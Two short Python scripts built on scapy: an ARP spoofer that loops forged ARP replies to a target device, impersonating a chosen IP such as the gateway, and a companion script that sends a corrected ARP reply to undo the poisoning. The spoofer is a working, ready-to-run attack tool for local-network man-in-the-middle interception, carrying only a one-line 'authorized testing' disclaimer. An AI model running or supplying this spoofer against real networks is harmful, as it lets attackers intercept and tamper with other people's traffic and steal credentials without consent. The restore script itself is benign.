```python
from scapy.all import ARP, send
import time

def arp_spoof(target_ip, fake_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=fake_ip)
    
    print(f"Sending ARP spoof packets to {target_ip}, claiming to be {fake_ip}...")
    
    try:
        while True:
            send(packet, verbose=0) 
            print(f"Sent spoofed packet to {target_ip}, pretending to be {fake_ip}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] ARP spoofing stopped. Exiting.")

if __name__ == "__main__":
    print("=== ARP Spoofer ===")
    print("NOTE: Use only for authorized testing or educational purposes.")
    
    target_ip = input("Enter the target device's IP address: ").strip()
    fake_ip = input("Enter the fake IP address to pretend as (e.g., router/gateway IP): ").strip()
    
    arp_spoof(target_ip, fake_ip)
```

```python
from scapy.all import ARP, send

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    arp_response = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    
    send(arp_response, verbose=False)
    print("Sent ARP reply to " + victim_ip + " to restore correct MAC address for gateway IP " + gateway_ip)

if __name__ == "__main__":
    victim_ip = input("Enter victim device IP: ")
    victim_mac = input("Enter victim device MAC address: ")
    gateway_ip = input("Enter gateway IP address: ")
    gateway_mac = input("Enter correct gateway MAC address: ")

    restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
```
